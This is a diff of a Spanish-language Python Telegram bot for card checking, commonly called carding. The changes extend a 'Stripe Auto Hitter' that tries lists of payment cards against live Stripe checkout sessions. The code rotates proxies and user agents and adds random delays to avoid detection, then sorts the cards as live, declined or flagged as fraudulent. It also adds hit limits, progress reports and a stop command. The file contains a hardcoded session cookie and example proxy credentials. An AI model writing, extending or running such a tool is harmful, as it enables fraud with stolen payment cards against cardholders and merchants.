@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 Bot de Telegram para verificar tarjetas - VERSIÓN COMPLETA
-Con Shopify + GiveWP + STRIPE AUTO HITTER (resultados reales)
+Con Shopify + GiveWP + STRIPE AUTO HITTER (con progreso y límite de intentos)
 """
 
 import os
@@ -73,7 +73,9 @@ class Settings:
 
     # Stripe Hitting
     STRIPE_HIT_DELAY = (1, 3)  # Delay aleatorio entre 1-3 segundos
-    STRIPE_AUTH_AMOUNT = 0.1   # $0.1 para autorización (como en la captura)
+    STRIPE_AUTH_AMOUNT = 0.1   # $0.1 para autorización
+    STRIPE_CARD_TIMEOUT = 30    # Timeout por tarjeta en segundos
+    DEFAULT_HIT_LIMIT = 5       # Límite de intentos por defecto
 
     # Cookie de sesión GiveWP
     GIVEWP_SESSION_COOKIE = "_mwp_templates_session_id=d3006e4f268f308359cb0b1f2deeba36c19961447cfb3b686d075f145bbe963b; __cf_bm=ql.06QngxLGWXpotjCgJ55McvKs7UURClo4CG8QmquY-1771952389-1.0.1.1-JXnh6OmstNvxZrNfJQCHYLUi0sWvh.2Pz7odsE17s7tuePaJzGI408PfBdPkVbVKMnslXizQGYgHqtMy3hiLsr41cX2o2_iuOQQhMtKHFv8; cookieyes-consent=consentid:VUZuS2R1MnNXUktFdW1DQ0dCeEt0TjRBa1JKbEpJelg,consent:,action:,necessary:,functional:,analytics:,performance:,advertisement:,other:"
@@ -383,19 +385,23 @@ def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
 
     return None, None
 
-# ================== NUEVO: STRIPE AUTO HITTER ==================
+# ================== STRIPE AUTO HITTER CON PROGRESO ==================
 class StripeAutoHitter:
-    """Bot de Auto Hit para Stripe - Resultados reales como en la captura"""
+    """Bot de Auto Hit para Stripe con progreso en vivo y límite de intentos"""
     
-    def __init__(self, proxies: List[str] = None):
+    def __init__(self, proxies: List[str] = None, hit_limit: int = 0):
         self.proxies = proxies if proxies else []
         self.proxy_index = 0
         self.results = []
+        self.hit_limit = hit_limit  # 0 = todas las tarjetas
+        self.stop_flag = False
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         ]
         
     def _get_next_proxy(self) -> Optional[str]:
@@ -422,7 +428,6 @@ class StripeAutoHitter:
     
     def _extract_session_id(self, url: str) -> Optional[str]:
         """Extrae el session_id de una URL de Stripe Checkout"""
-        # Patrones comunes en URLs de Stripe
         patterns = [
             r'cs_live_[a-zA-Z0-9]+',
             r'cs_test_[a-zA-Z0-9]+',
@@ -454,49 +459,7 @@ class StripeAutoHitter:
         
         return None
     
-    async def hit_checkout(self, checkout_url: str, cards: List[Dict]) -> List[StripeHitResult]:
-        """Intenta pagar con todas las tarjetas en la URL de checkout"""
-        
-        results = []
-        total = len(cards)
-        
-        # Extraer información de la URL
-        session_id = self._extract_session_id(checkout_url)
-        estimated_amount = self._extract_amount_from_hash(checkout_url)
-        
-        if not session_id:
-            logger.error("No se pudo extraer session_id de la URL")
-            return []
-        
-        for i, card in enumerate(cards):
-            # Rotar proxy
-            proxy = self._get_next_proxy()
-            proxy_display = "sin proxy"
-            if proxy:
-                proxy_display = proxy.split('@')[0].replace('http://', '') if '@' in proxy else proxy
-            
-            logger.info(f"💳 Probando tarjeta {i+1}/{total}: {card['bin']}xxxxxx{card['last4']} con proxy {proxy_display}")
-            
-            # Intentar el pago
-            result = await self._attempt_payment(
-                session_id=session_id,
-                card=card,
-                proxy=proxy,
-                estimated_amount=estimated_amount
-            )
-            
-            results.append(result)
-            
-            # Delay aleatorio entre intentos
-            delay = random.uniform(
-                Settings.STRIPE_HIT_DELAY[0],
-                Settings.STRIPE_HIT_DELAY[1]
-            )
-            await asyncio.sleep(delay)
-        
-        return results
-    
-    async def _attempt_payment(self, session_id: str, card: Dict, proxy: Optional[str], estimated_amount: Optional[float]) -> StripeHitResult:
+    async def _attempt_payment(self, session_id: str, card: Dict, proxy: Optional[str]) -> StripeHitResult:
         """Intenta un pago individual con proxy"""
         
         start_time = time.time()
@@ -526,11 +489,6 @@ class StripeAutoHitter:
             'payment_intent': session_id,
         }
         
-        # Si tenemos monto estimado, incluirlo
-        if estimated_amount:
-            payment_data['expected_amount'] = str(int(estimated_amount * 100))
-            payment_data['expected_currency'] = 'usd'
-        
         try:
             connector = aiohttp.TCPConnector(ssl=False)
             async with aiohttp.ClientSession(connector=connector) as session:
@@ -541,7 +499,8 @@ class StripeAutoHitter:
                         data=payment_data,
                         headers=headers,
                         proxy=proxy,
-                        ssl=False
+                        ssl=False,
+                        timeout=aiohttp.ClientTimeout(total=Settings.STRIPE_CARD_TIMEOUT)
                     ) as resp:
                         elapsed = time.time() - start_time
                         result = await resp.json()
@@ -551,7 +510,8 @@ class StripeAutoHitter:
                         'https://api.stripe.com/v1/payment_intents',
                         data=payment_data,
                         headers=headers,
-                        ssl=False
+                        ssl=False,
+                        timeout=aiohttp.ClientTimeout(total=Settings.STRIPE_CARD_TIMEOUT)
                     ) as resp:
                         elapsed = time.time() - start_time
                         result = await resp.json()
@@ -645,6 +605,85 @@ class StripeAutoHitter:
                 reason=f'http_{http_code}',
                 response_time=elapsed
             )
+    
+    async def hit_checkout_with_progress(self, checkout_url: str, cards: List[Dict], 
+                                          progress_callback=None) -> List[StripeHitResult]:
+        """
+        Intenta pagar con todas las tarjetas y reporta progreso
+        progress_callback: función async que recibe (current, total, last_result)
+        hit_limit: 0 = todas, >0 = número máximo de intentos
+        """
+        results = []
+        total = len(cards)
+        
+        # Si hay límite, solo procesar ese número de tarjetas
+        if self.hit_limit > 0:
+            cards_to_process = cards[:self.hit_limit]
+            total = len(cards_to_process)
+            logger.info(f"🎯 Límite de intentos: {self.hit_limit} tarjetas")
+        else:
+            cards_to_process = cards
+        
+        session_id = self._extract_session_id(checkout_url)
+        if not session_id:
+            logger.error("No se pudo extraer session_id de la URL")
+            return []
+        
+        estimated_amount = self._extract_amount_from_hash(checkout_url)
+        
+        for i, card in enumerate(cards_to_process):
+            # Verificar si debemos continuar (para poder detener)
+            if self.stop_flag:
+                logger.info("⏹ Proceso detenido por el usuario")
+                break
+            
+            proxy = self._get_next_proxy()
+            proxy_display = "sin proxy"
+            if proxy:
+                proxy_display = proxy.split('@')[0].replace('http://', '') if '@' in proxy else proxy
+            
+            logger.info(f"💳 [{i+1}/{total}] Probando tarjeta: {card['bin']}xxxxxx{card['last4']} con proxy {proxy_display}")
+            
+            # Intentar el pago con timeout
+            try:
+                result = await self._attempt_payment(session_id, card, proxy)
+                
+                # Si tenemos monto estimado, podemos usarlo para contexto
+                if estimated_amount:
+                    logger.info(f"💰 Monto estimado: ${estimated_amount:.2f}")
+                
+                results.append(result)
+                
+                # Llamar al callback de progreso si existe
+                if progress_callback:
+                    await progress_callback(i + 1, total, result)
+                
+                # Delay aleatorio entre intentos
+                delay = random.uniform(
+                    Settings.STRIPE_HIT_DELAY[0],
+                    Settings.STRIPE_HIT_DELAY[1]
+                )
+                await asyncio.sleep(delay)
+                
+            except Exception as e:
+                logger.error(f"❌ Error procesando tarjeta {i+1}: {e}")
+                result = StripeHitResult(
+                    card_last4=card['last4'],
+                    bin=card['bin'],
+                    status='ERROR',
+                    reason=str(e)[:50],
+                    response_time=0
+                )
+                results.append(result)
+                
+                if progress_callback:
+                    await progress_callback(i + 1, total, result)
+        
+        return results
+    
+    def stop(self):
+        """Detiene el proceso"""
+        self.stop_flag = True
 
 # ================== NUEVO: CAPTCHA DETECTOR ==================
 class CaptchaDetector:
@@ -1628,6 +1667,7 @@ class UserManager:
     def __init__(self, db: Database):
         self.db = db
         self._rate_lock = asyncio.Lock()
+        self.active_hitters = {}  # user_id -> StripeAutoHitter
 
     async def get_user_data(self, user_id: int) -> Dict:
         row = await self.db.fetch_one(
@@ -1774,8 +1814,9 @@ class CardCheckService:
         finally:
             await handler.close()
 
-    async def stripe_hit(self, user_id: int, url_index: int) -> Tuple[List[StripeHitResult], Dict[str, int]]:
-        """Ejecuta Stripe Auto Hitter"""
+    async def stripe_hit_with_progress(self, user_id: int, url_index: int, hit_limit: int = 0, 
+                                        progress_callback=None) -> Tuple[List[StripeHitResult], Dict[str, int]]:
+        """Ejecuta Stripe Auto Hitter con progreso y límite de intentos"""
         
         user_data = await self.user_manager.get_user_data(user_id)
         urls = user_data.get("stripe_urls", [])
@@ -1785,28 +1826,47 @@ class CardCheckService:
         if not urls or url_index >= len(urls):
             return [], {}
         
+        if not cards:
+            return [], {}
+        
         target_url = urls[url_index]['url']
         
-        hitter = StripeAutoHitter(proxies)
-        results = await hitter.hit_checkout(target_url, cards)
+        # Crear hitter con límite
+        hitter = StripeAutoHitter(proxies, hit_limit)
+        self.user_manager.active_hitters[user_id] = hitter
         
-        # Guardar resultados
-        for r in results:
-            await self.db.save_stripe_result(user_id, r, target_url)
-        
-        # Estadísticas
-        stats = {
-            'live': sum(1 for r in results if r.status == 'LIVE'),
-            'declined': sum(1 for r in results if r.status == 'DECLINED'),
-            'fraudulent': sum(1 for r in results if r.status == 'FRAUDULENT'),
-            'three_ds': sum(1 for r in results if r.three_ds),
-            'error': sum(1 for r in results if r.status not in ['LIVE', 'DECLINED', 'FRAUDULENT'] and not r.three_ds)
-        }
-        
-        return results, stats
+        try:
+            results = await hitter.hit_checkout_with_progress(target_url, cards, progress_callback)
+            
+            # Guardar resultados
+            for r in results:
+                await self.db.save_stripe_result(user_id, r, target_url)
+            
+            # Estadísticas
+            stats = {
+                'live': sum(1 for r in results if r.status == 'LIVE'),
+                'declined': sum(1 for r in results if r.status == 'DECLINED'),
+                'fraudulent': sum(1 for r in results if r.status == 'FRAUDULENT'),
+                'three_ds': sum(1 for r in results if r.three_ds),
+                'error': sum(1 for r in results if r.status not in ['LIVE', 'DECLINED', 'FRAUDULENT'] and not r.three_ds and r.status != '3DS'),
+                'timeout': sum(1 for r in results if r.status == 'TIMEOUT')
+            }
+            
+            return results, stats
+            
+        finally:
+            # Limpiar hitter activo
+            self.user_manager.active_hitters.pop(user_id, None)
+    
+    def stop_hit(self, user_id: int):
+        """Detiene el proceso de hitting en curso"""
+        hitter = self.user_manager.active_hitters.get(user_id)
+        if hitter:
+            hitter.stop()
+            return True
+        return False
 
 # ================== NUEVOS COMANDOS DE STRIPE ==================
-active_hits = {}  # user_id -> bool para controlar hits activos
 
 async def add_stripe_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Guarda una URL de Stripe Checkout"""
@@ -1886,22 +1946,77 @@ async def list_stripe_urls(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
-async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Inicia el proceso de hitting en una URL de Stripe - RESULTADOS REALES como en la captura"""
+async def remove_stripe_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Elimina una URL de Stripe guardada"""
     user_id = update.effective_user.id
     
     if not context.args:
         await update.message.reply_text(
-            "❌ Uso: /hit <número_url>\n"
-            "Ejemplo: /hit 1 (para usar la primera URL)"
+            "❌ Uso: /removestripe <número>\n"
+            "Ejemplo: /removestripe 1 (elimina la primera URL)\n"
+            "/removestripe all (elimina todas)"
+        )
+        return
+    
+    user_data = await user_manager.get_user_data(user_id)
+    urls = user_data.get('stripe_urls', [])
+    
+    if not urls:
+        await update.message.reply_text("📭 No hay URLs para eliminar")
+        return
+    
+    arg = context.args[0].lower()
+    
+    if arg == "all":
+        user_data['stripe_urls'] = []
+        await user_manager.update_user_data(user_id, stripe_urls=[])
+        await update.message.reply_text("🗑️ Todas las URLs de Stripe han sido eliminadas")
+        return
+    
+    try:
+        index = int(arg) - 1
+        if 0 <= index < len(urls):
+            removed = urls.pop(index)
+            await user_manager.update_user_data(user_id, stripe_urls=urls)
+            await update.message.reply_text(f"✅ URL eliminada: {removed.get('site', 'Stripe')}")
+        else:
+            await update.message.reply_text("❌ Número inválido")
+    except ValueError:
+        await update.message.reply_text("❌ Debes especificar un número o 'all'")
+
+async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Inicia el proceso de hitting en una URL de Stripe - CON PROGRESO EN VIVO"""
+    user_id = update.effective_user.id
+    
+    # Verificar si ya hay un proceso activo
+    if user_id in user_manager.active_hitters:
+        await update.message.reply_text("❌ Ya hay un proceso de Auto Hit en curso. Usa /stophit para detenerlo.")
+        return
+    
+    # Parsear argumentos: /hit <número_url> [límite]
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Uso: /hit <número_url> [límite]\n"
+            "Ejemplo: /hit 1 5 (prueba 5 tarjetas de la URL 1)\n"
+            "         /hit 1 (prueba todas las tarjetas)"
         )
         return
     
     try:
         url_index = int(context.args[0]) - 1
     except:
-        await update.message.reply_text("❌ Número inválido")
+        await update.message.reply_text("❌ Número de URL inválido")
         return
+    
+    # Límite opcional
+    hit_limit = 0
+    if len(context.args) > 1:
+        try:
+            hit_limit = int(context.args[1])
+            if hit_limit < 1:
+                hit_limit = 0
+        except:
+            hit_limit = 0
     
     user_data = await user_manager.get_user_data(user_id)
     urls = user_data.get('stripe_urls', [])
@@ -1930,27 +2045,43 @@ async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session_id = re.search(r'cs_live_[a-zA-Z0-9]+', target_url['url'])
     session_display = session_id.group(0) if session_id else "desconocido"
     
+    limit_text = f" (límite: {hit_limit} tarjetas)" if hit_limit > 0 else ""
+    
     # Mensaje de inicio
     msg = await update.message.reply_text(
-        f"🚀 *AUTO HIT INICIADO*\n"
+        f"🚀 *AUTO HIT INICIADO*{limit_text}\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
         f"📍 Sitio: {target_url.get('site', 'Stripe')}\n"
         f"💰 Monto: {target_url.get('amount', '??')}\n"
         f"🔗 Sesión: `{session_display}`\n"
-        f"💳 Tarjetas: {len(cards)}\n"
+        f"💳 Tarjetas: {len(cards) if hit_limit == 0 else min(hit_limit, len(cards))}/{len(cards)}\n"
         f"🔄 Proxies: {len(proxies)}\n\n"
         f"⏳ Procesando..."
     )
     
-    # Marcar hit activo
-    active_hits[user_id] = True
+    # Callback de progreso
+    async def progress_callback(current: int, total: int, last_result: StripeHitResult):
+        if current % 3 == 0 or current == total:  # Actualizar cada 3 tarjetas o al final
+            emoji = "✅" if last_result.status == 'LIVE' else "🔒" if last_result.three_ds else "❌"
+            progress_bar = create_progress_bar(current, total)
+            
+            await msg.edit_text(
+                f"🚀 *AUTO HIT EN PROGRESO*\n"
+                f"━━━━━━━━━━━━━━━━━━\n\n"
+                f"📍 Sitio: {target_url.get('site', 'Stripe')}\n"
+                f"💰 Monto: {target_url.get('amount', '??')}\n\n"
+                f"📊 Progreso: {progress_bar} {current}/{total}\n"
+                f"Último: {emoji} {last_result.card_last4} - {last_result.reason}\n\n"
+                f"⏳ Procesando... (usa /stophit para detener)"
+            )
     
     # Ejecutar hits
-    service = CardCheckService(db, user_manager)
-    results, stats = await service.stripe_hit(user_id, url_index)
+    results, stats = await card_service.stripe_hit_with_progress(
+        user_id, url_index, hit_limit, progress_callback
+    )
     
-    if not active_hits.get(user_id, False):
-        await msg.edit_text("⏹ Proceso detenido por el usuario")
+    if not results:
+        await msg.edit_text("❌ No se pudieron procesar las tarjetas")
         return
     
     # Actualizar estadísticas en la URL
@@ -1965,8 +2096,8 @@ async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     response.append(f"Monto: {target_url.get('amount', '??')}")
     response.append(f"Sitio: {target_url.get('site', 'Stripe')}\n")
     
-    # Mostrar cada resultado
-    for r in results[:15]:  # Mostrar máximo 15 para no exceder límite de Telegram
+    # Mostrar cada resultado (máximo 15)
+    for r in results[:15]:
         emoji = "✅" if r.status == 'LIVE' else "🔒" if r.three_ds else "❌" if r.status == 'DECLINED' else "🚨" if r.status == 'FRAUDULENT' else "⚠️"
         card_display = f". . . {r.card_last4}" if len(r.card_last4) == 4 else r.card_last4
         
@@ -1978,6 +2109,8 @@ async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – LIVE: {r.reason}")
         elif r.status == 'DECLINED':
             response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Declined: {r.reason}")
+        elif r.status == 'TIMEOUT':
+            response.append(f"⏱️ {card_display} (Stripe Auth $0.1) – Timeout: {r.reason}")
         else:
             response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Error: {r.reason}")
     
@@ -1990,19 +2123,16 @@ async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     response.append(f"❌ DECLINED: {stats['declined']}")
     response.append(f"🚨 FRAUDULENT: {stats['fraudulent']}")
     response.append(f"🔒 3DS: {stats['three_ds']}")
+    response.append(f"⏱️ TIMEOUT: {stats.get('timeout', 0)}")
     response.append(f"⚠️ ERRORES: {stats['error']}")
     
     await msg.edit_text("\n".join(response), parse_mode="Markdown")
-    
-    # Limpiar estado
-    active_hits.pop(user_id, None)
 
 async def stop_hit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Detiene el proceso de hitting en curso"""
     user_id = update.effective_user.id
     
-    if user_id in active_hits:
-        active_hits[user_id] = False
+    if card_service.stop_hit(user_id):
         await update.message.reply_text("⏹ Deteniendo proceso de Auto Hit...")
     else:
         await update.message.reply_text("No hay proceso de Auto Hit activo")
@@ -2157,10 +2287,13 @@ async def show_stripe_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Comandos:\n"
         "• `/addstripe <url>` - Guardar URL de Stripe\n"
         "• `/mystripe` - Ver URLs guardadas\n"
-        "• `/hit <número>` - Iniciar Auto Hit\n"
+        "• `/removestripe <n/all>` - Eliminar URL(s)\n"
+        "• `/hit <n> [límite]` - Iniciar Auto Hit\n"
         "• `/stophit` - Detener proceso\n"
         "• `/stripestats` - Ver estadísticas\n\n"
-        "💡 *Resultados reales:* LIVE, DECLINED, FRAUDULENT, 3DS"
+        "💡 *Ejemplos:*\n"
+        "`/hit 1` - Probar todas las tarjetas\n"
+        "`/hit 1 5` - Probar solo 5 tarjetas"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
@@ -2329,7 +2462,8 @@ async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Workers: {Settings.MAX_WORKERS_PER_USER}\n"
         f"Rate limit: {Settings.RATE_LIMIT_SECONDS}s\n"
         f"Daily limit: {Settings.DAILY_LIMIT_CHECKS}\n"
-        f"Stripe Auth: ${Settings.STRIPE_AUTH_AMOUNT}"
+        f"Stripe Auth: ${Settings.STRIPE_AUTH_AMOUNT}\n"
+        f"Card timeout: {Settings.STRIPE_CARD_TIMEOUT}s"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
@@ -2510,6 +2644,11 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Mass check en progreso")
         return
     
+    # Verificar si es comando /donate sin argumentos
+    if text.startswith('/donate') and not text.startswith('/donate5') and not text.startswith('/donate10') and not text.startswith('/donate20'):
+        await donate(update, context)
+        return
+    
     card_data = CardValidator.parse_card(text)
     if card_data:
         user_data = await user_manager.get_user_data(user_id)
@@ -2670,7 +2809,8 @@ async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not context.args:
         await update.message.reply_text(
-            "❌ Uso: /addproxy ip:puerto o ip:puerto:user:pass"
+            "❌ Uso: /addproxy ip:puerto o ip:puerto:user:pass\n"
+            "Ejemplo: /addproxy 23.26.53.37:6003:ywdcxpbz:rumq51bx8tk3"
         )
         return
     
@@ -2769,6 +2909,7 @@ def main():
     # Comandos Stripe
     app.add_handler(CommandHandler("addstripe", add_stripe_url))
     app.add_handler(CommandHandler("mystripe", list_stripe_urls))
+    app.add_handler(CommandHandler("removestripe", remove_stripe_url))
     app.add_handler(CommandHandler("hit", hit_stripe))
     app.add_handler(CommandHandler("stophit", stop_hit))
     app.add_handler(CommandHandler("stripestats", stripe_stats))
